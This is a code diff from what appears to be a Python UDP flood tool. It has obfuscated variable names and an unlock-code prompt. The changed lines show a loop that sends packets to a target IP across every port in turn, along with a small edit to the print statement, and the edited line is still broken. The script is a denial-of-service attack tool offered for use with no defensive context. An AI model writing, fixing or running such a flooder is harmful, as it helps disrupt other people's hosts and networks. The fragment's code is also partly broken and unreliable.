@@ -3,7 +3,8 @@ import os
 import time
 import socket
 import random
-
+#Code Time
+init (autoreset =True )#line:3
 def startMessage ():#line:7
     OO0O0OO0OOO0OO0O0 =input (Fore .YELLOW +"Enter Code To Unlock The Tool : ")#line:8
     OOOO0OO000OO0OOOO ="ILOVEU"#line:9
@@ -51,7 +52,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print ("Sent %s packet to %s throught port:%s%")(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s%" (sent,ip,port))
      if port == 65534:
        port = 1
 
